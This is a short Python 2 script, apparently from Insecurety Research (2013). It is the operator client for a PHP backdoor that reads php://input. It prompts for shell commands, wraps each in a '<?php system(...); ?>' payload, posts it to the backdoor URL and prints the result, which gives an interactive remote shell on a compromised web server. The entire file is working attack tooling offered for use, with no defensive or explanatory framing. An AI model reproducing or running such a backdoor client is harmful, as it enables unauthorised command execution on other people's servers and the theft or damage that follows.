#!/usr/bin/python
# Client for the php://input based backdoor
# Website: insecurety.net
# Author: infodox
# Twitter: @info_dox
# Insecurety Research - 2013
import requests
import sys

if (len(sys.argv) != 2):
    print "Usage: " + sys.argv[0] + " <url of backdoor>"
    print "Example: " + sys.argv[0] + " http://localhost/odd.php"
    sys.exit(0)

url = sys.argv[1]
print "\n[+] URL in use: %s \n" %(url)
while True:
    cmd = raw_input("shell:~$ ")
    if cmd == "quit":
        print "\n[-] Quitting"
        sys.exit(0)
    elif cmd == "exit":
        print "\n[-] Quitting"
        sys.exit(0)
    else:
        payload = """<?php system('%s'); ?>""" %(cmd)
        hax = requests.post(url, payload)
        print hax.text
